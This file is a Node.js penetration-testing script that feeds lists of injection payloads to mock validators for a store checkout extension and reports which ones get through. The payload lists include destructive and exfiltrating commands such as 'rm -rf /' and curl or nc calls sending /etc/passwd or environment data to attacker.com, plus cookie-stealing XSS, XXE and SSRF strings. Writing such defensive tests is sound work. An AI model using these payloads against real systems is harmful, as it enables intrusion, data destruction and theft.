#!/usr/bin/env node

/**
 * Penetration Testing Script for ReturnsX Thank You Page Extension
 * 
 * This script performs automated penetration testing to validate
 * security implementations against common attack vectors.
 */

const fs = require('fs');
const path = require('path');

class PenetrationTester {
  constructor() {
    this.results = [];
    this.testCases = this.loadTestCases();
  }

  /**
   * Load penetration test cases
   */
  loadTestCases() {
    return {
      xssPayloads: [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload="alert(1)">',
        '<div onclick="alert(1)">Click me</div>',
        'javascript:alert(document.domain)',
        '<script>document.cookie="stolen="+document.cookie</script>',
        '<img src="x" onerror="fetch(\'/steal?data=\'+document.cookie)">',
        '<svg onload="eval(atob(\'YWxlcnQoMSk=\'))">',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        '<link rel="stylesheet" href="javascript:alert(1)">',
        '<style>@import "javascript:alert(1)";</style>',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
      ],

      sqlInjectionPayloads: [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' UNION SELECT * FROM passwords --",
        "admin'--",
        "admin'/*",
        "' OR 1=1--",
        "' OR 'a'='a",
        "') OR ('1'='1",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --",
      ],

      ldapInjectionPayloads: [
        'test@example.com)(|(password=*))',
        'test@example.com)(|(uid=*))',
        'test@example.com)(&(password=*)(uid=admin))',
        '*)(uid=*',
        '*)(|(uid=*))',
        '*)(&(password=*)',
      ],

      commandInjectionPayloads: [
        '; rm -rf /',
        '&& cat /etc/passwd',
        '| nc attacker.com 4444',
        '`whoami`',
        '$(whoami)',
        '; ping attacker.com',
        '& dir',
        '|| type C:\\Windows\\System32\\drivers\\etc\\hosts',
        '; curl http://attacker.com/steal?data=$(cat /etc/passwd)',
        '`curl -X POST -d "$(env)" http://attacker.com/data`',
      ],

      pathTraversalPayloads: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%2f..%2f..%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..\\..\\..\\etc\\passwd',
        '/var/www/../../etc/passwd',
        'C:\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      ],

      nosqlInjectionPayloads: [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "this.password.length > 0"}',
        '{"$or": [{"password": {"$exists": true}}]}',
        '{"username": {"$ne": "admin"}}',
        '{"$and": [{"username": {"$ne": ""}}, {"password": {"$ne": ""}}]}',
      ],

      prototypePollutionPayloads: [
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        '{"prototype": {"isAdmin": true}}',
        '{"__proto__.isAdmin": true}',
        '{"constructor.prototype.isAdmin": true}',
      ],

      xxePayloads: [
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
        '<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><test>&xxe;</test>',
      ],

      ssrfPayloads: [
        'http://localhost:22',
        'http://127.0.0.1:3306',
        'http://169.254.169.254/latest/meta-data/',
        'file:///etc/passwd',
        'gopher://127.0.0.1:25/_HELO%20localhost',
        'dict://127.0.0.1:11211/stats',
      ],

      headerInjectionPayloads: [
        'test\r\nX-Injected-Header: injected',
        'test\nSet-Cookie: admin=true',
        'test\r\n\r\n<script>alert(1)</script>',
        'test%0d%0aX-Injected: true',
        'test%0aLocation: http://attacker.com',
      ],
    };
  }

  /**
   * Run all penetration tests
   */
  async runTests() {
    console.log('🔍 Starting Penetration Testing for ReturnsX Extension\n');

    try {
      await this.testXSSVulnerabilities();
      await this.testSQLInjection();
      await this.testLDAPInjection();
      await this.testCommandInjection();
      await this.testPathTraversal();
      await this.testNoSQLInjection();
      await this.testPrototypePollution();
      await this.testInputValidation();
      await this.testErrorHandling();
      await this.testAuthenticationBypass();
      
      this.generateReport();
    } catch (error) {
      console.error('❌ Penetration testing failed:', error);
      process.exit(1);
    }
  }

  /**
   * Test XSS vulnerabilities
   */
  async testXSSVulnerabilities() {
    console.log('🕷️  Testing XSS Vulnerabilities...');
    
    const testResults = [];
    
    for (const payload of this.testCases.xssPayloads) {
      const result = await this.testPayload('XSS', payload, [
        this.testSanitizeHtml,
        this.testSanitizeCustomMessage,
        this.testValidateCustomerData,
      ]);
      testResults.push(result);
    }

    const vulnerableTests = testResults.filter(r => r.vulnerable);
    
    if (vulnerableTests.length > 0) {
      this.addResult('HIGH', 'XSS Vulnerability', `${vulnerableTests.length} XSS payloads bypassed sanitization`);
      vulnerableTests.forEach(test => {
        this.addResult('HIGH', 'XSS Details', `Payload bypassed: ${test.payload.substring(0, 50)}...`);
      });
    } else {
      this.addResult('PASS', 'XSS Protection', 'All XSS payloads properly sanitized');
    }
  }

  /**
   * Test SQL injection vulnerabilities
   */
  async testSQLInjection() {
    console.log('💉 Testing SQL Injection...');
    
    const testResults = [];
    
    for (const payload of this.testCases.sqlInjectionPayloads) {
      const phoneResult = this.testValidatePhone(payload);
      const emailResult = this.testValidateEmail(payload + '@example.com');
      
      testResults.push({
        payload,
        phoneVulnerable: phoneResult.isValid,
        emailVulnerable: emailResult.isValid,
      });
    }

    const vulnerableTests = testResults.filter(r => r.phoneVulnerable || r.emailVulnerable);
    
    if (vulnerableTests.length > 0) {
      this.addResult('CRITICAL', 'SQL Injection', `${vulnerableTests.length} SQL injection payloads accepted`);
    } else {
      this.addResult('PASS', 'SQL Injection Protection', 'All SQL injection payloads rejected');
    }
  }

  /**
   * Test LDAP injection vulnerabilities
   */
  async testLDAPInjection() {
    console.log('🔍 Testing LDAP Injection...');
    
    const vulnerableTests = [];
    
    for (const payload of this.testCases.ldapInjectionPayloads) {
      const result = this.testValidateEmail(payload);
      if (result.isValid) {
        vulnerableTests.push(payload);
      }
    }

    if (vulnerableTests.length > 0) {
      this.addResult('HIGH', 'LDAP Injection', `${vulnerableTests.length} LDAP injection payloads accepted`);
    } else {
      this.addResult('PASS', 'LDAP Injection Protection', 'All LDAP injection payloads rejected');
    }
  }

  /**
   * Test command injection vulnerabilities
   */
  async testCommandInjection() {
    console.log('⚡ Testing Command Injection...');
    
    const vulnerableTests = [];
    
    for (const payload of this.testCases.commandInjectionPayloads) {
      const phoneResult = this.testValidatePhone('+923001234567' + payload);
      const emailResult = this.testValidateEmail('test' + payload + '@example.com');
      
      if (phoneResult.isValid || emailResult.isValid) {
        vulnerableTests.push(payload);
      }
    }

    if (vulnerableTests.length > 0) {
      this.addResult('CRITICAL', 'Command Injection', `${vulnerableTests.length} command injection payloads accepted`);
    } else {
      this.addResult('PASS', 'Command Injection Protection', 'All command injection payloads rejected');
    }
  }

  /**
   * Test path traversal vulnerabilities
   */
  async testPathTraversal() {
    console.log('📁 Testing Path Traversal...');
    
    const vulnerableTests = [];
    
    for (const payload of this.testCases.pathTraversalPayloads) {
      const phoneResult = this.testValidatePhone(payload);
      const emailResult = this.testValidateEmail(payload + '@example.com');
      
      if (phoneResult.isValid || emailResult.isValid) {
        vulnerableTests.push(payload);
      }
    }

    if (vulnerableTests.length > 0) {
      this.addResult('HIGH', 'Path Traversal', `${vulnerableTests.length} path traversal payloads accepted`);
    } else {
      this.addResult('PASS', 'Path Traversal Protection', 'All path traversal payloads rejected');
    }
  }

  /**
   * Test NoSQL injection vulnerabilities
   */
  async testNoSQLInjection() {
    console.log('🍃 Testing NoSQL Injection...');
    
    const vulnerableTests = [];
    
    for (const payload of this.testCases.nosqlInjectionPayloads) {
      const phoneResult = this.testValidatePhone(payload);
      const emailResult = this.testValidateEmail(payload + '@example.com');
      
      if (phoneResult.isValid || emailResult.isValid) {
        vulnerableTests.push(payload);
      }
    }

    if (vulnerableTests.length > 0) {
      this.addResult('HIGH', 'NoSQL Injection', `${vulnerableTests.length} NoSQL injection payloads accepted`);
    } else {
      this.addResult('PASS', 'NoSQL Injection Protection', 'All NoSQL injection payloads rejected');
    }
  }

  /**
   * Test prototype pollution vulnerabilities
   */
  async testPrototypePollution() {
    console.log('🔗 Testing Prototype Pollution...');
    
    const testData = {
      phone: '+923001234567',
      __proto__: { isAdmin: true },
      constructor: { prototype: { isAdmin: true } },
      prototype: { isAdmin: true }
    };

    const result = this.testValidateCustomerData(testData);
    
    if (result.sanitized && (
      result.sanitized.hasOwnProperty('__proto__') ||
      result.sanitized.hasOwnProperty('constructor') ||
      result.sanitized.hasOwnProperty('prototype')
    )) {
      this.addResult('CRITICAL', 'Prototype Pollution', 'Prototype pollution attack succeeded');
    } else {
      this.addResult('PASS', 'Prototype Pollution Protection', 'Prototype pollution attack blocked');
    }
  }

  /**
   * Test input validation edge cases
   */
  async testInputValidation() {
    console.log('✅ Testing Input Validation Edge Cases...');
    
    const edgeCases = [
      { type: 'phone', value: '', shouldFail: true },
      { type: 'phone', value: 'a'.repeat(100), shouldFail: true },
      { type: 'phone', value: '+92300123456789012345', shouldFail: true },
      { type: 'email', value: '', shouldFail: true },
      { type: 'email', value: 'a'.repeat(300) + '@example.com', shouldFail: true },
      { type: 'email', value: 'test@', shouldFail: true },
      { type: 'email', value: '@example.com', shouldFail: true },
    ];

    let failedValidations = 0;

    edgeCases.forEach(testCase => {
      let result;
      if (testCase.type === 'phone') {
        result = this.testValidatePhone(testCase.value);
      } else {
        result = this.testValidateEmail(testCase.value);
      }

      if (testCase.shouldFail && result.isValid) {
        failedValidations++;
        this.addResult('MEDIUM', 'Input Validation', `${testCase.type} validation failed for: ${testCase.value.substring(0, 20)}...`);
      }
    });

    if (failedValidations === 0) {
      this.addResult('PASS', 'Input Validation', 'All edge cases properly validated');
    }
  }

  /**
   * Test error handling for information disclosure
   */
  async testErrorHandling() {
    console.log('🚨 Testing Error Handling...');
    
    const sensitiveErrors = [
      'Database connection failed: password=secret123',
      'API key invalid: sk_live_123456789',
      'JWT token expired: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
      'Authentication failed with bearer token abc123def456',
    ];

    let informationLeaks = 0;

    sensitiveErrors.forEach(error => {
      const sanitized = this.testSanitizeErrorMessage(error);
      
      // Check if sensitive information is still present
      if (sanitized.includes('secret123') || 
          sanitized.includes('sk_live_') ||
          sanitized.includes('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9') ||
          sanitized.includes('abc123def456')) {
        informationLeaks++;
        this.addResult('MEDIUM', 'Information Disclosure', `Sensitive data leaked in error: ${sanitized}`);
      }
    });

    if (informationLeaks === 0) {
      this.addResult('PASS', 'Error Handling', 'No sensitive information disclosed in errors');
    }
  }

  /**
   * Test authentication bypass attempts
   */
  async testAuthenticationBypass() {
    console.log('🔐 Testing Authentication Bypass...');
    
    // Test JWT manipulation attempts
    const maliciousJWTs = [
      'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.',
      'null',
      '{"alg":"none","typ":"JWT"}.{"sub":"admin","iat":1516239022}.',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature',
    ];

    // This would require actual authentication service testing
    // For now, we'll just log that this test should be performed manually
    this.addResult('INFO', 'Authentication Testing', 'Manual authentication bypass testing recommended');
  }

  /**
   * Test individual payload against sanitization functions
   */
  async testPayload(type, payload, testFunctions) {
    const results = [];
    
    for (const testFunc of testFunctions) {
      try {
        const result = testFunc.call(this, payload);
        results.push({
          function: testFunc.name,
          vulnerable: this.isPayloadSuccessful(type, payload, result),
          result
        });
      } catch (error) {
        results.push({
          function: testFunc.name,
          vulnerable: false,
          error: error.message
        });
      }
    }

    return {
      payload,
      vulnerable: results.some(r => r.vulnerable),
      results
    };
  }

  /**
   * Check if payload was successful (bypassed security)
   */
  isPayloadSuccessful(type, payload, result) {
    switch (type) {
      case 'XSS':
        if (typeof result === 'string') {
          return result.includes('<script>') || 
                 result.includes('javascript:') || 
                 result.includes('onerror') ||
                 result.includes('onload') ||
                 result.includes('alert');
        }
        if (result && result.isValid) {
          return true; // Payload was accepted when it should be rejected
        }
        return false;
      
      default:
        return false;
    }
  }

  /**
   * Mock validation functions (these would import from actual modules in real testing)
   */
  testValidatePhone(phone) {
    // Simplified validation for testing
    if (typeof phone !== 'string') return { isValid: false, errors: ['Not a string'] };
    if (phone.length === 0) return { isValid: false, errors: ['Empty'] };
    if (phone.length > 20) return { isValid: false, errors: ['Too long'] };
    if (!/^[\+\d\s\-\(\)]+$/.test(phone)) return { isValid: false, errors: ['Invalid characters'] };
    
    // Check for suspicious patterns
    const suspiciousPatterns = [
      /[<>]/,
      /javascript:/i,
      /[|&;$`\\]/,
      /\.\./,
      /%[0-9a-f]{2}/i,
    ];
    
    if (suspiciousPatterns.some(pattern => pattern.test(phone))) {
      return { isValid: false, errors: ['Suspicious pattern'] };
    }
    
    return { isValid: true, sanitized: phone };
  }

  testValidateEmail(email) {
    // Simplified validation for testing
    if (typeof email !== 'string') return { isValid: false, errors: ['Not a string'] };
    if (email.length === 0) return { isValid: false, errors: ['Empty'] };
    if (email.length > 254) return { isValid: false, errors: ['Too long'] };
    
    const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    if (!emailPattern.test(email)) return { isValid: false, errors: ['Invalid format'] };
    
    // Check for suspicious patterns
    const suspiciousPatterns = [
      /[<>]/,
      /javascript:/i,
      /[()]/,
      /[|&;$`\\]/,
      /\.\./,
    ];
    
    if (suspiciousPatterns.some(pattern => pattern.test(email))) {
      return { isValid: false, errors: ['Suspicious pattern'] };
    }
    
    return { isValid: true, sanitized: email };
  }

  testValidateCustomerData(data) {
    if (!data || typeof data !== 'object') {
      return { isValid: false, errors: ['Invalid data'] };
    }

    const sanitized = {};
    const errors = [];

    // Only copy known safe fields
    if (data.phone) {
      const phoneResult = this.testValidatePhone(data.phone);
      if (phoneResult.isValid) {
        sanitized.phone = phoneResult.sanitized;
      } else {
        errors.push(...phoneResult.errors);
      }
    }

    if (data.email) {
      const emailResult = this.testValidateEmail(data.email);
      if (emailResult.isValid) {
        sanitized.email = emailResult.sanitized;
      } else {
        errors.push(...emailResult.errors);
      }
    }

    // Explicitly ignore prototype pollution attempts
    // Don't copy __proto__, constructor, prototype

    return {
      isValid: errors.length === 0,
      errors,
      sanitized: errors.length === 0 ? sanitized : undefined
    };
  }

  testSanitizeHtml(content) {
    if (typeof content !== 'string') return '';
    
    return content
      .replace(/<[^>]*>/g, '')
      .replace(/javascript:/gi, '')
      .replace(/on\w+=/gi, '')
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .trim();
  }

  testSanitizeCustomMessage(message) {
    return this.testSanitizeHtml(message);
  }

  testSanitizeErrorMessage(error) {
    if (typeof error !== 'string') return 'Unknown error';
    
    let sanitized = error;
    
    const sensitivePatterns = [
      /password[:\s=]+[^\s]+/gi,
      /token[:\s=]+[a-zA-Z0-9_.-]+/gi,
      /key[:\s=]+[a-zA-Z0-9_.-]+/gi,
      /bearer\s+[a-zA-Z0-9_.-]+/gi,
    ];

    sensitivePatterns.forEach(pattern => {
      sanitized = sanitized.replace(pattern, '[REDACTED]');
    });

    return sanitized;
  }

  /**
   * Add test result
   */
  addResult(severity, category, description) {
    this.results.push({
      severity,
      category,
      description,
      timestamp: new Date().toISOString()
    });
  }

  /**
   * Generate penetration testing report
   */
  generateReport() {
    console.log('\n🎯 Penetration Testing Report');
    console.log('=============================\n');

    const severityCounts = {
      CRITICAL: 0,
      HIGH: 0,
      MEDIUM: 0,
      LOW: 0,
      PASS: 0,
      INFO: 0
    };

    // Count results by severity
    this.results.forEach(result => {
      severityCounts[result.severity]++;
    });

    // Print summary
    console.log('Summary:');
    console.log(`✅ PASS: ${severityCounts.PASS}`);
    console.log(`ℹ️  INFO: ${severityCounts.INFO}`);
    console.log(`🟡 LOW: ${severityCounts.LOW}`);
    console.log(`🟠 MEDIUM: ${severityCounts.MEDIUM}`);
    console.log(`🔴 HIGH: ${severityCounts.HIGH}`);
    console.log(`💀 CRITICAL: ${severityCounts.CRITICAL}\n`);

    // Group results by category
    const categories = {};
    this.results.forEach(result => {
      if (!categories[result.category]) {
        categories[result.category] = [];
      }
      categories[result.category].push(result);
    });

    // Print detailed results
    Object.keys(categories).forEach(category => {
      console.log(`\n${category}:`);
      console.log('─'.repeat(category.length + 1));
      
      categories[category].forEach(result => {
        const icon = this.getSeverityIcon(result.severity);
        console.log(`${icon} ${result.description}`);
      });
    });

    // Generate security recommendations
    this.generateSecurityRecommendations(severityCounts);

    // Save detailed report
    this.saveDetailedReport();
  }

  /**
   * Get severity icon
   */
  getSeverityIcon(severity) {
    const icons = {
      CRITICAL: '💀',
      HIGH: '🔴',
      MEDIUM: '🟠',
      LOW: '🟡',
      PASS: '✅',
      INFO: 'ℹ️'
    };
    return icons[severity] || '❓';
  }

  /**
   * Generate security recommendations
   */
  generateSecurityRecommendations(severityCounts) {
    console.log('\n🛡️  Security Recommendations:');
    console.log('==============================\n');

    if (severityCounts.CRITICAL > 0) {
      console.log('🚨 CRITICAL VULNERABILITIES FOUND');
      console.log('- Immediate action required before deployment');
      console.log('- These vulnerabilities could lead to complete system compromise\n');
    }

    if (severityCounts.HIGH > 0) {
      console.log('⚠️  HIGH PRIORITY VULNERABILITIES');
      console.log('- Address before production release');
      console.log('- Could lead to data breach or unauthorized access\n');
    }

    if (severityCounts.MEDIUM > 0) {
      console.log('📋 MEDIUM PRIORITY ISSUES');
      console.log('- Address in next development cycle');
      console.log('- Could be exploited under specific conditions\n');
    }

    console.log('General Security Recommendations:');
    console.log('- Implement Web Application Firewall (WAF)');
    console.log('- Regular security audits and penetration testing');
    console.log('- Keep dependencies updated');
    console.log('- Implement proper logging and monitoring');
    console.log('- Use Content Security Policy (CSP) headers');
    console.log('- Implement rate limiting');
    console.log('- Regular security training for developers');
  }

  /**
   * Save detailed report to file
   */
  saveDetailedReport() {
    const reportData = {
      timestamp: new Date().toISOString(),
      summary: this.results.reduce((acc, result) => {
        acc[result.severity] = (acc[result.severity] || 0) + 1;
        return acc;
      }, {}),
      results: this.results,
      testCases: Object.keys(this.testCases).reduce((acc, key) => {
        acc[key] = this.testCases[key].length;
        return acc;
      }, {})
    };

    const reportPath = path.join(__dirname, 'penetration-test-report.json');
    fs.writeFileSync(reportPath, JSON.stringify(reportData, null, 2));
    
    console.log(`\n📄 Detailed report saved to: ${reportPath}`);
  }
}

// Run penetration tests
if (require.main === module) {
  const tester = new PenetrationTester();
  tester.runTests().catch(error => {
    console.error('Penetration testing failed:', error);
    process.exit(1);
  });
}

module.exports = PenetrationTester;